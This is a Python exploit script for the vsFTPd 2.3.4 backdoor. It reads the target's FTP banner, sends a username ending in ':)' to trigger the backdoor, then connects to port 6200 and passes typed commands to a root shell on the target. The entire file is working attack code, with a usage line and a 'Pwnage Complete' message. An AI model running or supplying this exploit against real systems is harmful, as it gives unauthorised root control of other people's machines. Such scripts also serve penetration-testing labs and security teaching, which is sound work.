import sys
import socket
import threading
import time 
import os 
import string

host = sys.argv[1]
port = sys.argv[2]

if len(sys.argv) == 3:
    pass
else:
    print("usage: ./vsftpd.py [TARGET IP] [PORT]")
    sys.exit(1)

def trigger():
    trigger_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        trigger_socket.connect((host, int(port)))
    except Exception:
        print("[*] Failed to Reach Target")
        sys.exit(1)

    print("[*] Attempting to Trigger the Back Door... ")
    banner = trigger_socket.recv(1024)
    if 'vsFTPd 2.3.4' in banner:
        trigger_socket.send("USER backdoored:)\n")
        trigger_socket.recv(1024)
        trigger_socket.send("PASS invalid\n")
        trigger_socket.close()
        print("[*] Trigger Process Complete, Spawning Shell...")
        return
    else:
        print ("[!] Invalid Service Detected")
        sys.exit(1)


def recv_from_shell(sock, status):
    sock.settimeout(3)
    while status == True:
        try:
            print (sock.recv(1024).strip())
        except socket.timeout:
            pass
        except Exception:
            return


def main():
    trigger()
    shell_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    shell_status = True
    try:
        shell_socket.connect((host, 6200))
    except Exception:
        print("[!] Failed Interaction with Shell")
        sys.exit(1)
    shell_recv_thread =  threading.Thread(target=recv_from_shell, args=(shell_socket, shell_status))
    shell_recv_thread.start()
    print("[*] Root Shell Spawned, Pwnage Complete\n")
    while 1:
        command = raw_input().strip()
        if command == "exit":
            shell_status = False
            shell_socket.close()
            shell_recv_thread.join()
            sys.exit(0)
        shell_socket.send(command + '\n')

main()

